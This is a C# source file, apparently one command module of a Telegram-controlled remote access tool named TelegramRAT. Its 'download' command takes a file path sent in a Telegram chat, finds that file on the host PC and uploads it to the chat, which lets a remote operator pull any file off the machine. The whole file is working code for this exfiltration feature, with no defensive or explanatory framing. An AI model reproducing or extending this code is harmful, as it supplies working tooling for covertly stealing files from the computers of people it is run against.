using Telegram.Bot;
using Telegram.Bot.Types;
using TelegramRAT.Services;

namespace TelegramRAT.Commands.File;

public class DownloadCommand(ITelegramBotClient botClient, IBotNotificationService notificationService, IFileSystemService fileSystemService) : AbstractBotCommand
{
    public override string Command => "download";
    public override string Description => "Send file from PC by path";
    public override string Example => "/download hello.txt";

    public override async Task ExecuteAsync(BotCommandModel model)
    {
        if (model.Message == null) return;

        try
        {
            var pathInput = model.Args.Length > 0 ? string.Join(' ', model.Args) : (model.RawArgs ?? string.Empty);
            var filePath = fileSystemService.SanitizePath(pathInput);
            var baseDirectory = fileSystemService.GetCurrentDirectory();
            
            var normalizedPath = Path.IsPathRooted(filePath)
                ? fileSystemService.GetFullPath(filePath)
                : fileSystemService.GetFullPath(Path.Combine(baseDirectory, filePath));

            if (!fileSystemService.FileExists(normalizedPath))
            {
                await botClient.SendMessage(model.Message.Chat.Id, $"There is no file \"{filePath}\" at path {normalizedPath}");
                return;
            }

            using var fileStream = fileSystemService.OpenFileRead(normalizedPath);
            {
                await botClient.SendDocument(model.Message.Chat.Id, new InputFileStream(fileStream, fileSystemService.GetFileName(normalizedPath)), caption: filePath);
            }
        }
        catch (Exception ex)
        {
            await notificationService.ReportExceptionAsync(model.Message, ex);
        }
    }
}
